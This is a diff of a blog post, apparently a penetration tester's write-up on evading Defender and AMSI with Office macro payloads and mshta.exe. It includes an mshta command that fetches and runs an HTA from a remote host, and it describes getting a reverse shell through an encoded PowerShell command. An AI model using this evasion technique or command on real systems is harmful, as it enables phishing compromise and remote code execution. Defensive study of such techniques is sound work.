@@ -12,7 +12,7 @@ tags:
 I was looking to run my own phishing campaigns on my current organization and was testing office document payloads.
 I tried the old fashioned VBA in the macro running the shell function as well as some others, and defender caught most if not all of them.
 Using this tool [Macro-Pack](https://github.com/sevagas/macro_pack) works sometimes but often, it would get flagged or the powershell command would not properly run.
-I noticed that most of the issues i was running into was this AMSI popup ![asmi popup](https://images.app.goo.gl/FxF1Hj3V9mk2wfyP7)
+I noticed that most of the issues i was running into was this AMSI popup ![asmi popup](/popup.png)
 
 So i began researching AMSI as i never heard of it. The following resources break down AMSI and bypass options.
 
@@ -34,7 +34,7 @@ That pretty much goes through alot of lolbins but what i noticed was they mentio
 ```
 mshta.exe http://192.168.43.103/Launcher.hta
 ```
-Doesnt get flagged.
+Mshta.exe doesnt get flagged.
 
 
 
@@ -96,3 +96,7 @@ using <a href="#" onClick="JavaScript:alert('Version of this HTA is ' + hwHTA.ve
 
 Im not very savy to Jscript or VB so i found this online entered my own powershell encoded command into it.
 And to my surprise it did not trigger defender and my reverse shell came in soon after. So with just using an old school method found with soome googling and leveraging mshta.exe you too can bypass defender as well as AMSI to get code execution.
+
+
+## How to bypass AMSI (The Harder Way, But Also More Flexible)
+[Hoang Bui's Blog](https://medium.com/@fsx30/excel-4-0-macro-old-but-new-967071106be9)
